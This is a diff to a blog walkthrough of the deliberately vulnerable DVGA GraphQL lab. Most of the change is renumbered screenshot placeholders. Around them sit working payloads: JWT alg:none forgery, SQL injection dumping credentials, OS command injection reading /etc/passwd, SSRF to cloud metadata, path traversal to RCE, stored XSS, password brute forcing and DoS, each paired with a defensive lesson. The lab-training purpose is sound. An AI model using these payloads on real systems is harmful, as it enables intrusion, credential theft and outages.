@@ -67,15 +67,27 @@ In easy mode introspection is fully enabled:
 { __schema { queryType { fields { name } } mutationType { fields { name } } } }
 ```
 
+> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `{ __schema { queryType { fields { name } } mutationType { fields { name } } } }`.
+> _Save as_ `images/dvga-walkthrough/2.png` _then replace this block with_ `![1. Introspection — dump the whole schema](/images/dvga-walkthrough/2.png)`_._
+
+
 ```bash
 gql '{"query":"{__schema{types{name kind}}}"}'
 ```
+
+> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"{__schema{types{name kind}}}"}'`.
+> _Save as_ `images/dvga-walkthrough/3.png` _then replace this block with_ `![1. Introspection — dump the whole schema](/images/dvga-walkthrough/3.png)`_._
+
 
 Feed the JSON to `graphql-voyager`/`InQL`, or walk individual types:
 
 ```graphql
 { __type(name:"PasteObject"){ name fields{ name type{ name } } } }
 ```
+
+> **Picture goes here (#4).** Capture this request/response or command step in Burp/terminal. Key line: `{ __type(name:"PasteObject"){ name fields{ name type{ name } } } }`.
+> _Save as_ `images/dvga-walkthrough/4.png` _then replace this block with_ `![1. Introspection — dump the whole schema](/images/dvga-walkthrough/4.png)`_._
+
 
 **Hard mode:** `IntrospectionMiddleware` only rejects the literal `__schema` field — `__type` is not blocked:
 
@@ -85,14 +97,18 @@ curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \
   http://localhost:5013/graphql
 ```
 
+> **Picture goes here (#5).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \`.
+> _Save as_ `images/dvga-walkthrough/5.png` _then replace this block with_ `![1. Introspection — dump the whole schema](/images/dvga-walkthrough/5.png)`_._
+
+
 **Lesson:** blocklisting one field is not introspection protection. Disable the introspection mechanism (`__schema`, `__type`, field suggestions) entirely.
 
-> **Picture goes here (#2).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/2.png` _then replace this block with_ `![1. Introspection — dump the whole schema](/images/dvga-walkthrough/2.png)`_._
+> **Picture goes here (#6).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/6.png` _then replace this block with_ `![1. Introspection — dump the whole schema](/images/dvga-walkthrough/6.png)`_._
 
 ## 2. Broken access control — read everyone's private pastes
-> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{pastes(public:false,limit:5){id title content owner{name}}}"}'`.
-> _Save as_ `images/dvga-walkthrough/3.png` _then replace this block with_ `![2. Broken access control — read everyone's private pastes](/images/dvga-walkthrough/3.png)`_._
+> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{pastes(public:false,limit:5){id title content owner{name}}}"}'`.
+> _Save as_ `images/dvga-walkthrough/7.png` _then replace this block with_ `![2. Broken access control — read everyone's private pastes](/images/dvga-walkthrough/7.png)`_._
 
 
 `resolve_pastes` filters on the `public` flag, not on the caller, and requires no auth:
@@ -101,16 +117,20 @@ curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \
 gql '{"query":"{pastes(public:false,limit:5){id title content owner{name}}}"}'
 ```
 
+> **Picture goes here (#8).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"{pastes(public:false,limit:5){id title content owner{name}}}"}'`.
+> _Save as_ `images/dvga-walkthrough/8.png` _then replace this block with_ `![2. Broken access control — read everyone's private pastes](/images/dvga-walkthrough/8.png)`_._
+
+
 Sibling flaws: `paste(id:)` reads any paste, `editPaste`/`deletePaste` modify/remove any paste, `readAndBurn` reads+deletes, and `deleteAllPastes` wipes the table unauthenticated.
 
 **Lesson:** every resolver needs authentication and an ownership predicate (`filter_by(id=id, owner_id=current_user)`).
 
-> **Picture goes here (#4).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/4.png` _then replace this block with_ `![2. Broken access control — read everyone's private pastes](/images/dvga-walkthrough/4.png)`_._
+> **Picture goes here (#9).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/9.png` _then replace this block with_ `![2. Broken access control — read everyone's private pastes](/images/dvga-walkthrough/9.png)`_._
 
 ## 3. Authentication bypass — forged JWT (`alg:none`)
-> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `import json, base64, urllib.request`.
-> _Save as_ `images/dvga-walkthrough/5.png` _then replace this block with_ `![3. Authentication bypass — forged JWT (alg:none)](/images/dvga-walkthrough/5.png)`_._
+> **Picture goes here (#10).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `import json, base64, urllib.request`.
+> _Save as_ `images/dvga-walkthrough/10.png` _then replace this block with_ `![3. Authentication bypass — forged JWT (alg:none)](/images/dvga-walkthrough/10.png)`_._
 
 
 `get_identity()` decodes the token with verification disabled, then `resolve_me` copies the identity into the context, and `resolve_password` returns the real password when the context identity is `admin`.
@@ -126,14 +146,18 @@ print(urllib.request.urlopen(urllib.request.Request(
     headers={"Content-Type":"application/json"})).read().decode())
 ```
 
+> **Picture goes here (#11).** Capture this step in the decompiler/editor or terminal. Key line: `import json, base64, urllib.request`.
+> _Save as_ `images/dvga-walkthrough/11.png` _then replace this block with_ `![3. Authentication bypass — forged JWT (alg:none)](/images/dvga-walkthrough/11.png)`_._
+
+
 Result: the admin password (`changeme`) in plaintext. With the hardcoded secret `dvga` you can also mint validly-signed HS256 tokens — but `alg:none` is simpler.
 
-> **Picture goes here (#6).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/6.png` _then replace this block with_ `![3. Authentication bypass — forged JWT (alg:none)](/images/dvga-walkthrough/6.png)`_._
+> **Picture goes here (#12).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/12.png` _then replace this block with_ `![3. Authentication bypass — forged JWT (alg:none)](/images/dvga-walkthrough/12.png)`_._
 
 ## 4. SQL injection — `pastes(filter:)`
-> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql "{\"query\":\"{pastes(public:true,filter:\\\"' UNION SELECT id,username,password,1,1,1`.
-> _Save as_ `images/dvga-walkthrough/7.png` _then replace this block with_ `![4. SQL injection — pastes(filter:)](/images/dvga-walkthrough/7.png)`_._
+> **Picture goes here (#13).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql "{\"query\":\"{pastes(public:true,filter:\\\"' UNION SELECT id,username,password,1,1,1`.
+> _Save as_ `images/dvga-walkthrough/13.png` _then replace this block with_ `![4. SQL injection — pastes(filter:)](/images/dvga-walkthrough/13.png)`_._
 
 
 The filter is interpolated into raw SQL with Python `%` formatting. The `pastes` table has 8 columns, so match the count to `UNION` the `users` table:
@@ -142,14 +166,18 @@ The filter is interpolated into raw SQL with Python `%` formatting. The `pastes`
 gql "{\"query\":\"{pastes(public:true,filter:\\\"' UNION SELECT id,username,password,1,1,1,1,1 FROM users--\\\"){id title content}}\"}"
 ```
 
+> **Picture goes here (#14).** Capture this request/response or command step in Burp/terminal. Key line: `gql "{\"query\":\"{pastes(public:true,filter:\\\"' UNION SELECT id,username,password,1,1,1`.
+> _Save as_ `images/dvga-walkthrough/14.png` _then replace this block with_ `![4. SQL injection — pastes(filter:)](/images/dvga-walkthrough/14.png)`_._
+
+
 Boolean variant `' OR 1=1--` returns all rows. This is a textbook SQLi → credential dump.
 
-> **Picture goes here (#8).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/8.png` _then replace this block with_ `![4. SQL injection — pastes(filter:)](/images/dvga-walkthrough/8.png)`_._
+> **Picture goes here (#15).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/15.png` _then replace this block with_ `![4. SQL injection — pastes(filter:)](/images/dvga-walkthrough/15.png)`_._
 
 ## 5. OS command injection — `systemDebug` and `systemDiagnostics`
-> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{systemDebug(arg:\"-ef; id; uname -a\")}"}'`.
-> _Save as_ `images/dvga-walkthrough/9.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/9.png)`_._
+> **Picture goes here (#16).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{systemDebug(arg:\"-ef; id; uname -a\")}"}'`.
+> _Save as_ `images/dvga-walkthrough/16.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/16.png)`_._
 
 
 `systemDebug` concatenates its argument into `ps {arg}` and runs it via `os.popen`:
@@ -158,11 +186,19 @@ Boolean variant `' OR 1=1--` returns all rows. This is a textbook SQLi → crede
 gql '{"query":"{systemDebug(arg:\"-ef; id; uname -a\")}"}'
 ```
 
+> **Picture goes here (#17).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"{systemDebug(arg:\"-ef; id; uname -a\")}"}'`.
+> _Save as_ `images/dvga-walkthrough/17.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/17.png)`_._
+
+
 This is **unauthenticated RCE** and is not gated even in hard mode. `systemDiagnostics` requires the (leaked) admin password, then runs the supplied `cmd`:
 
 ```bash
 gql '{"query":"{systemDiagnostics(username:\"admin\",password:\"changeme\",cmd:\"id; cat /etc/passwd\")}"}'
 ```
+
+> **Picture goes here (#18).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"{systemDiagnostics(username:\"admin\",password:\"changeme\",cmd:\"id; cat /`.
+> _Save as_ `images/dvga-walkthrough/18.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/18.png)`_._
+
 
 **Hard-mode bypass:** the allowlist only checks `cmd.startswith(('echo', 'ps', 'whoami', 'tail'))`, so command substitution slips through:
 
@@ -172,12 +208,16 @@ curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \
   http://localhost:5013/graphql
 ```
 
-> **Picture goes here (#10).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/10.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/10.png)`_._
+> **Picture goes here (#19).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \`.
+> _Save as_ `images/dvga-walkthrough/19.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/19.png)`_._
+
+
+> **Picture goes here (#20).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/20.png` _then replace this block with_ `![5. OS command injection — systemDebug and systemDiagnostics](/images/dvga-walkthrough/20.png)`_._
 
 ## 6. SSRF + command injection — `importPaste`
-> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# SSRF to cloud metadata (never target 127.0.0.1:5013 — see DoS below)`.
-> _Save as_ `images/dvga-walkthrough/11.png` _then replace this block with_ `![6. SSRF + command injection — importPaste](/images/dvga-walkthrough/11.png)`_._
+> **Picture goes here (#21).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# SSRF to cloud metadata (never target 127.0.0.1:5013 — see DoS below)`.
+> _Save as_ `images/dvga-walkthrough/21.png` _then replace this block with_ `![6. SSRF + command injection — importPaste](/images/dvga-walkthrough/21.png)`_._
 
 
 The URL is assembled and passed to `curl` through a shell:
@@ -187,6 +227,10 @@ The URL is assembled and passed to `curl` through a shell:
 gql '{"query":"mutation{importPaste(host:\"169.254.169.254\",port:80,path:\"/latest/meta-data/\",scheme:\"http\"){result}}"}'
 ```
 
+> **Picture goes here (#22).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"mutation{importPaste(host:\"169.254.169.254\",port:80,path:\"/latest/meta-d`.
+> _Save as_ `images/dvga-walkthrough/22.png` _then replace this block with_ `![6. SSRF + command injection — importPaste](/images/dvga-walkthrough/22.png)`_._
+
+
 **Hard-mode bypass:** `strip_dangerous_characters` removes only `;` and `&` — pipes and `$()` survive:
 
 ```bash
@@ -195,12 +239,16 @@ curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \
   http://localhost:5013/graphql
 ```
 
-> **Picture goes here (#12).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/12.png` _then replace this block with_ `![6. SSRF + command injection — importPaste](/images/dvga-walkthrough/12.png)`_._
+> **Picture goes here (#23).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s -H 'Content-Type: application/json' -H 'X-DVGA-MODE: Expert' \`.
+> _Save as_ `images/dvga-walkthrough/23.png` _then replace this block with_ `![6. SSRF + command injection — importPaste](/images/dvga-walkthrough/23.png)`_._
+
+
+> **Picture goes here (#24).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/24.png` _then replace this block with_ `![6. SSRF + command injection — importPaste](/images/dvga-walkthrough/24.png)`_._
 
 ## 7. Path traversal → RCE — `uploadPaste`
-> **Picture goes here (#13).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# 1. prove traversal`.
-> _Save as_ `images/dvga-walkthrough/13.png` _then replace this block with_ `![7. Path traversal → RCE — uploadPaste](/images/dvga-walkthrough/13.png)`_._
+> **Picture goes here (#25).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# 1. prove traversal`.
+> _Save as_ `images/dvga-walkthrough/25.png` _then replace this block with_ `![7. Path traversal → RCE — uploadPaste](/images/dvga-walkthrough/25.png)`_._
 
 
 `save_file()` concatenates the filename into `open(WEB_UPLOADDIR + filename, 'w')` with no sanitisation.
@@ -214,14 +262,18 @@ gql '{"query":"mutation{uploadPaste(filename:\"../setup.py\",content:\"import os
 curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5013/start_over
 ```
 
+> **Picture goes here (#26).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"mutation{uploadPaste(filename:\"../pwned_marker.txt\",content:\"traversal-w`.
+> _Save as_ `images/dvga-walkthrough/26.png` _then replace this block with_ `![7. Path traversal → RCE — uploadPaste](/images/dvga-walkthrough/26.png)`_._
+
+
 A complete unauthenticated **file-write → RCE** chain.
 
-> **Picture goes here (#14).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/14.png` _then replace this block with_ `![7. Path traversal → RCE — uploadPaste](/images/dvga-walkthrough/14.png)`_._
+> **Picture goes here (#27).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/27.png` _then replace this block with_ `![7. Path traversal → RCE — uploadPaste](/images/dvga-walkthrough/27.png)`_._
 
 ## 8. Stored XSS
-> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"mutation{createPaste(title:\"xss\",content:\"<img src=x onerror=alert(docum`.
-> _Save as_ `images/dvga-walkthrough/15.png` _then replace this block with_ `![8. Stored XSS](/images/dvga-walkthrough/15.png)`_._
+> **Picture goes here (#28).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"mutation{createPaste(title:\"xss\",content:\"<img src=x onerror=alert(docum`.
+> _Save as_ `images/dvga-walkthrough/28.png` _then replace this block with_ `![8. Stored XSS](/images/dvga-walkthrough/28.png)`_._
 
 
 The public-pastes page builds HTML with a template literal and passes it to jQuery's `$(htmlString)`, which parses and executes embedded handlers:
@@ -230,14 +282,18 @@ The public-pastes page builds HTML with a template literal and passes it to jQue
 gql '{"query":"mutation{createPaste(title:\"xss\",content:\"<img src=x onerror=alert(document.domain)>\",public:true){paste{id}}}"}'
 ```
 
+> **Picture goes here (#29).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"mutation{createPaste(title:\"xss\",content:\"<img src=x onerror=alert(docum`.
+> _Save as_ `images/dvga-walkthrough/29.png` _then replace this block with_ `![8. Stored XSS](/images/dvga-walkthrough/29.png)`_._
+
+
 Any user viewing Public Pastes executes the payload in the site origin.
 
-> **Picture goes here (#16).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/16.png` _then replace this block with_ `![8. Stored XSS](/images/dvga-walkthrough/16.png)`_._
+> **Picture goes here (#30).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/30.png` _then replace this block with_ `![8. Stored XSS](/images/dvga-walkthrough/30.png)`_._
 
 ## 9. Audit log / info disclosure
-> **Picture goes here (#17).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{audits{id gqloperation gqlquery}}"}'`.
-> _Save as_ `images/dvga-walkthrough/17.png` _then replace this block with_ `![9. Audit log / info disclosure](/images/dvga-walkthrough/17.png)`_._
+> **Picture goes here (#31).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"{audits{id gqloperation gqlquery}}"}'`.
+> _Save as_ `images/dvga-walkthrough/31.png` _then replace this block with_ `![9. Audit log / info disclosure](/images/dvga-walkthrough/31.png)`_._
 
 
 `resolve_audits` returns **all** audit rows unauthenticated, including raw query text — and `clean_query()` only masks double-quoted `password:"..."`/`token:"..."`, so variables, single quotes and other argument names leak.
@@ -246,12 +302,16 @@ Any user viewing Public Pastes executes the payload in the site origin.
 gql '{"query":"{audits{id gqloperation gqlquery}}"}'
 ```
 
-> **Picture goes here (#18).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/18.png` _then replace this block with_ `![9. Audit log / info disclosure](/images/dvga-walkthrough/18.png)`_._
+> **Picture goes here (#32).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"{audits{id gqloperation gqlquery}}"}'`.
+> _Save as_ `images/dvga-walkthrough/32.png` _then replace this block with_ `![9. Audit log / info disclosure](/images/dvga-walkthrough/32.png)`_._
+
+
+> **Picture goes here (#33).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/33.png` _then replace this block with_ `![9. Audit log / info disclosure](/images/dvga-walkthrough/33.png)`_._
 
 ## 10. Hard-mode middleware bypasses
-> **Picture goes here (#19).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# brute force several admin passwords in one request`.
-> _Save as_ `images/dvga-walkthrough/19.png` _then replace this block with_ `![10. Hard-mode middleware bypasses](/images/dvga-walkthrough/19.png)`_._
+> **Picture goes here (#34).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# brute force several admin passwords in one request`.
+> _Save as_ `images/dvga-walkthrough/34.png` _then replace this block with_ `![10. Hard-mode middleware bypasses](/images/dvga-walkthrough/34.png)`_._
 
 
 - **`__type`** recovers the schema despite the `__schema` block.
@@ -266,12 +326,16 @@ ops = [{"query":'mutation{login(username:"admin",password:"%s"){accessToken}}' %
        for p in ["admin","123456","changeme","password"]]
 ```
 
-> **Picture goes here (#20).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/20.png` _then replace this block with_ `![10. Hard-mode middleware bypasses](/images/dvga-walkthrough/20.png)`_._
+> **Picture goes here (#35).** Capture this step in the decompiler/editor or terminal. Key line: `ops = [{"query":'mutation{login(username:"admin",password:"%s"){accessToken}}' % p}`.
+> _Save as_ `images/dvga-walkthrough/35.png` _then replace this block with_ `![10. Hard-mode middleware bypasses](/images/dvga-walkthrough/35.png)`_._
+
+
+> **Picture goes here (#36).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/36.png` _then replace this block with_ `![10. Hard-mode middleware bypasses](/images/dvga-walkthrough/36.png)`_._
 
 ## 11. DoS
-> **Picture goes here (#21).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"mutation{importPaste(host:\"127.0.0.1\",port:5013,path:\"/\",scheme:\"http\`.
-> _Save as_ `images/dvga-walkthrough/21.png` _then replace this block with_ `![11. DoS](/images/dvga-walkthrough/21.png)`_._
+> **Picture goes here (#37).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `gql '{"query":"mutation{importPaste(host:\"127.0.0.1\",port:5013,path:\"/\",scheme:\"http\`.
+> _Save as_ `images/dvga-walkthrough/37.png` _then replace this block with_ `![11. DoS](/images/dvga-walkthrough/37.png)`_._
 
 
 `helpers.run_cmd` is blocking `os.popen` on a single gevent worker. An `importPaste` to an unreachable host — or to the server itself — blocks the worker indefinitely:
@@ -279,6 +343,10 @@ ops = [{"query":'mutation{login(username:"admin",password:"%s"){accessToken}}' %
 ```bash
 gql '{"query":"mutation{importPaste(host:\"127.0.0.1\",port:5013,path:\"/\",scheme:\"http\"){result}}"}'
 ```
+
+> **Picture goes here (#38).** Capture this request/response or command step in Burp/terminal. Key line: `gql '{"query":"mutation{importPaste(host:\"127.0.0.1\",port:5013,path:\"/\",scheme:\"http\`.
+> _Save as_ `images/dvga-walkthrough/38.png` _then replace this block with_ `![11. DoS](/images/dvga-walkthrough/38.png)`_._
+
 
 One unauthenticated request takes the service offline.
 
@@ -325,5 +393,5 @@ gql '{"query":"{audits{id gqloperation gqlquery}}"}'
 
 {% endraw %}
 
-> **Picture goes here (#22).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/dvga-walkthrough/22.png` _then replace this block with_ `![Related posts](/images/dvga-walkthrough/22.png)`_._
+> **Picture goes here (#39).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/dvga-walkthrough/39.png` _then replace this block with_ `![Related posts](/images/dvga-walkthrough/39.png)`_._
